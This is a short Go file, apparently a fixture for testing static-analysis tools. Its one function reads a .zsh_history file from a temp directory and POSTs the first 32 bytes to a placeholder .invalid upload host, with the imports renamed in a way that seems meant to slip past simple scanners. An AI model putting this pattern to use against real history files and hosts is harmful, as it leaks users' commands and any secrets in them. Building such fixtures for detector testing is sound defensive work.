// Static-analysis fixture only. No entry point; reads synthetic test data.
package historyfixture

import (
	client "net/http"
	files "os"
	paths "path/filepath"
	"strings"
)

func fixtureText(path string) string {
	data, _ := files.ReadFile(path)
	return string(data)
}

func uploadSyntheticHistory() {
	body := fixtureText(paths.Join("/tmp/history-fixture", ".zsh_history"))
	if len(body) > 32 {
		body = body[:32]
	}
	client.Post("https://history-fixture.invalid/upload", "text/plain", strings.NewReader(body))
}
